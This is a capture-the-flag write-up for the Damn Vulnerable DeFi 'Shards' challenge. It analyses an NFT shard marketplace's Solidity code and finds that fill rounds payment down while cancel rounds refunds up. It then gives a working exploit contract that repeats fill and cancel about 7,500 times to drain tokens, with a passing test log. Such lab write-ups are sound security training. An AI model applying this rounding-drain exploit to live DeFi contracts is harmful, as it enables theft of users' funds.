## [Shards](https://www.damnvulnerabledefi.xyz/challenges/shards/)

> The Shards NFT marketplace is a permissionless smart contract enabling holders of Damn Valuable NFTs to sell them at any price (expressed in USDC).
>
> These NFTs could be so damn valuable that sellers can offer them in smaller fractions (“shards”). Buyers can buy these shards, represented by an ERC1155 token. The marketplace only pays the seller once the whole NFT is sold.
>
> The marketplace charges sellers a 1% fee in Damn Valuable Tokens (DVT). These can be stored in a secure on-chain vault, which in turn integrates with a DVT staking system.
>
> Somebody is selling one NFT for… wow, a million USDC?
>
> You better dig into that marketplace before the degens find out.
>
> You start with no DVTs. Rescue as much funds as you can in a single transaction, and deposit the assets into the designated recovery account.

```solidity
function _isSolved() private view {
  // Balance of staking contract didn't change
  assertEq(token.balanceOf(address(staking)), STAKING_REWARDS, "Not enough tokens in staking rewards");

  // Marketplace has less tokens
  uint256 missingTokens = initialTokensInMarketplace - token.balanceOf(address(marketplace));
  assertGt(missingTokens, initialTokensInMarketplace * 1e16 / 100e18, "Marketplace still has tokens");

  // All recovered funds sent to recovery account
  assertEq(token.balanceOf(recovery), missingTokens, "Not enough tokens in recovery account");
  assertEq(token.balanceOf(player), 0, "Player still has tokens");

  // Player must have executed a single transaction
  assertEq(vm.getNonce(player), 1);
}
```

### Analysis

We need to transfer most of the DVT tokens from the  `ShardsNFTMarketplace` contract to the `recovery` address. There are three potential places where this can be accomplished: `ShardsNFTMarketplace::cancel`, `ShardsNFTMarketplace::_cancel`, and `feeVault` (`ShardsNFTMarketplace` approved tokens to this address in the constructor). Let us investigate `feeVault` first.

```solidity
contract ShardsNFTMarketplace is IShardsNFTMarketplace, IERC721Receiver, ERC1155 {
  // [...]
  constructor(
    DamnValuableNFT _nft,
    DamnValuableToken _paymentToken,
    address _feeVaultImplementation,
    address _oracle,
    uint256 _initialRate
  ) ERC1155("") {
    paymentToken = _paymentToken;
    nft = _nft;
    oracle = _oracle;
    rate = _initialRate;

    // Deploy minimal proxy for fee vault. Then initialize it and approve max
    feeVault = ShardsFeeVault(Clones.clone(_feeVaultImplementation));
    feeVault.initialize(msg.sender, _paymentToken);
    paymentToken.approve(address(feeVault), type(uint256).max);
  }
  // [...]
  function cancel(uint64 offerId, uint256 purchaseIndex) external {
    Offer storage offer = offers[offerId];
    Purchase storage purchase = purchases[offerId][purchaseIndex];
    address buyer = purchase.buyer;

    if (msg.sender != buyer) revert NotAllowed();
    if (!offer.isOpen) revert NotOpened(offerId);
    if (purchase.cancelled) revert AlreadyCancelled();
    if (
      purchase.timestamp + CANCEL_PERIOD_LENGTH < block.timestamp
          || block.timestamp > purchase.timestamp + TIME_BEFORE_CANCEL
    ) revert BadTime();

    offer.stock += purchase.shards;
    assert(offer.stock <= offer.totalShards); // invariant
    purchase.cancelled = true;

    emit Cancelled(offerId, purchaseIndex);

    paymentToken.transfer(buyer, purchase.shards.mulDivUp(purchase.rate, 1e6));
  }
  // [...]
  function _closeOffer(uint64 offerId) private {
    Offer memory offer = offers[offerId];
    Purchase[] memory _purchases = purchases[offerId];
    uint256 payment;

    for (uint256 i = 0; i < _purchases.length; i++) {
      Purchase memory purchase = _purchases[i];
      if (purchase.cancelled) continue;
      payment += purchase.shards.mulWadUp(purchase.rate);
      _mint({to: purchase.buyer, id: offer.nftId, value: purchase.shards, data: ""});
      assert(balanceOf(purchase.buyer, offer.nftId) <= offer.totalShards); // invariant
    }

    offers[offerId].isOpen = false;
    emit ClosedOffer(offerId);
    paymentToken.transfer(offer.seller, payment);
  }
}
```

#### `ShardsFeeVault`

We can indeed move all the funds from the `ShardsNFTMarketplace` to `ShardsFeeVault` or `DamnValuableStaking` by calling `ShardsNFTMarketplace::depositFees`. However, I can not find any way to transfer the tokens from  `ShardsFeeVault` or `DamnValuableStaking` to the `recovery` address. Let us investigate another place that might be able to do so: `ShardsNFTMarketplace::cancel`.

```solidity
contract ShardsFeeVault is Initializable, Ownable {
  // [...]
  function deposit(uint256 amount, bool stake) external {
    token.transferFrom(msg.sender, address(this), amount);
    if (address(staking) != address(0) && stake) {
      staking.stake(amount);
    }
  }
  // [...]
  function enableStaking(DamnValuableStaking _staking) external onlyOwner {
    staking = _staking;
    require(staking.token() == token);
    token.approve(address(_staking), type(uint256).max);
  }
}
contract ShardsNFTMarketplace is IShardsNFTMarketplace, IERC721Receiver, ERC1155 {
  // [...]
  function depositFees(bool stake) external {
    feeVault.deposit(feesInBalance, stake);
    feesInBalance = 0;
  }
  // [...]
}
```

#### `ShardsNFTMarketplace::cancel`

Looks like we can refund the order. Let us see if we can purchase something. The `purchases[` string appears in the `ShardsNFTMarketplace::fill` function. Let us investigate it.

```solidity
contract ShardsNFTMarketplace is IShardsNFTMarketplace, IERC721Receiver, ERC1155 {
  // [...]
  /**
   * @notice To cancel open offers once the waiting period is over.
   */
  function cancel(uint64 offerId, uint256 purchaseIndex) external {
    Offer storage offer = offers[offerId];
    Purchase storage purchase = purchases[offerId][purchaseIndex];
    address buyer = purchase.buyer;

    if (msg.sender != buyer) revert NotAllowed();
    if (!offer.isOpen) revert NotOpened(offerId);
    if (purchase.cancelled) revert AlreadyCancelled();
    if (
      purchase.timestamp + CANCEL_PERIOD_LENGTH < block.timestamp
          || block.timestamp > purchase.timestamp + TIME_BEFORE_CANCEL
    ) revert BadTime();

    offer.stock += purchase.shards;
    assert(offer.stock <= offer.totalShards); // invariant
    purchase.cancelled = true;

    emit Cancelled(offerId, purchaseIndex);

    paymentToken.transfer(buyer, purchase.shards.mulDivUp(purchase.rate, 1e6));
  }
  // [...]
}
```

#### `ShardsNFTMarketplace::fill`

The price of the NFT is calculated using the `mulDivDown` function, which allows us to buy a small amount for free. This challenge is essentially solved.

```solidity
contract ShardsNFTMarketplace is IShardsNFTMarketplace, IERC721Receiver, ERC1155 {
  // [...]
  function fill(uint64 offerId, uint256 want) external returns (uint256 purchaseIndex) {
    Offer storage offer = offers[offerId];
    if (want == 0) revert BadAmount();
    if (offer.price == 0) revert UnknownOffer();
    if (want > offer.stock) revert OutOfStock();
    if (!offer.isOpen) revert NotOpened(offerId);

    offer.stock -= want;
    purchaseIndex = purchases[offerId].length;
    uint256 _currentRate = rate;
    purchases[offerId].push(
      Purchase({
        shards: want,
        rate: _currentRate,
        buyer: msg.sender,
        timestamp: uint64(block.timestamp),
        cancelled: false
      })
    );
    paymentToken.transferFrom(
        msg.sender, address(this), want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)
    );
    if (offer.stock == 0) _closeOffer(offerId);
  }
  // [...]
}
```

### Solution

```solidity
contract ShardSolution {
  using FixedPointMathLib for uint256;
  uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
  uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;
  uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;

  constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) {
    /* 
      The price is
        want.mulDivDown(
          NFT_OFFER_PRICE.mulDivDown(MARKETPLACE_INITIAL_RATE, 1e6)), 
          NFT_OFFER_SHARDS
        )
    */
    uint256 p = NFT_OFFER_PRICE * MARKETPLACE_INITIAL_RATE / 1e6;
    uint256 want = NFT_OFFER_SHARDS / p;
    uint256 amount_drained_per_trial = want.mulDivUp(MARKETPLACE_INITIAL_RATE, 1e6);
    uint256 marketplace_initial_balance = token.balanceOf(address(marketplace));
    uint256 amount_needed_to_drain = marketplace_initial_balance * 1e16 / 100e18;
    uint256 num_trials = amount_needed_to_drain / amount_drained_per_trial + 1;

    console.log("amount_drained_per_trial: %d", amount_drained_per_trial);
    console.log("num_trials: %d", num_trials);

    for (uint256 i = 0; i < num_trials; i++) {
      marketplace.fill(1, want);
      marketplace.cancel(1, i);
    }
    token.transfer(recovery, token.balanceOf(address(this)));
  }
}
```

```shell
[PASS] test_shards() (gas: 616999297)
Logs:
  marketplace_initial_balance: 750000000000000000000
  amount_drained_per_trial: 9975000000000
  num_trials: 7519
```

Full solution can be found in [Shards.t.sol](./Shards.t.sol#L118).